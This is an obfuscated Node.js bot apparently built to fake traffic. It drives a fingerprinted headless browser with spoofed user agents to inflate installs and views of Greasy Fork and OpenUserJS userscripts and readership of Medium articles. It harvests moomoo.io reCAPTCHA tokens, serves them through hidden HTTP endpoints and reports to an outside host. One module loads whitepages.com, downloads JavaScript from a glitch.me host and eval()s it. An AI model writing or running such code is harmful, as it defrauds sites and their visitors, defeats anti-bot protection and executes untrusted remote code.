      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + a0(0xf) + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + a0(0x8) + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + Y(0x14) + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x409 * 0x3 + 0x4 * 0x854 + -0x2d6b
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1dd * 0x2 + -0x1b05 + 0x174b)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0xc60 + -0x1 * -0x949 + 0x37b), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x16ae + 0x2386 + 0x19 * -0x250), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x21d1 * 0x1 + 0x43 * 0x43 + -0x335a;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x13 * -0x14d + -0x186d + -0x14 * -0x275; w < getRandomInt(-0x2fe * 0x1 + -0x1d03 + 0x2002, -0x1035 + 0xa1b + 0x61f); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x2ad0 + 0x1 * 0x96a + 0x8ed * 0x1e);
        }
      }();
    }, -0x3 * 0xa53 + 0x5a7 + 0x19b6), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x1 * -0x1eb9 + -0xd2e + -0x3 * 0x5d9;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1f2 * -0x1 + 0x1d0d + -0x1eff, 0x67 + -0x4 * -0x7ed + -0xaa3 * 0x3)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0xc4ee + 0x7 * 0xf68 + -0x5dcb * 0x2);
    }, 0x1ec3 + -0x1b4e + -0x311), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x6 * 0x1ec + 0xf48 + -0x6b4 * 0x4;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0xce5 + -0x1cc7 + 0x33 * 0x10c), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x14a7 + -0x8d1 + -0xbd6), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0xc2be6 + -0x6d * -0x19d2 + -0x96eb0);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0xc33 + -0xbf1 + 0x22);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x22f * -0x1 + -0x24d7 + 0x27ce);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x3 * -0xa49 + -0x1f5 * -0x11 + 0x1d26);
}
doFlags['doOUJS'] && ((async () => {
  const a3 = c,
    a2 = b;
  async function f() {
    const a1 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x1de3 + 0xf92 + -0x1 * -0xe52) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1bd4 + 0x2121 + -0x4 * 0x153));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x1e57 + -0x12 * -0x16f + 0x489, D['indexOf']('\x20'));
        return B ? E['slice'](0xa7f + 0x158a + -0x2009, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x2 * 0xd8e + 0xbac + 0x48),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + a1(0x3) + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x5 * 0x62f + -0x7d9 + -0xffe * -0x1),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': a1(0x9)
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + a2(0x6, '5yuB') + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + a3(0xb) + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
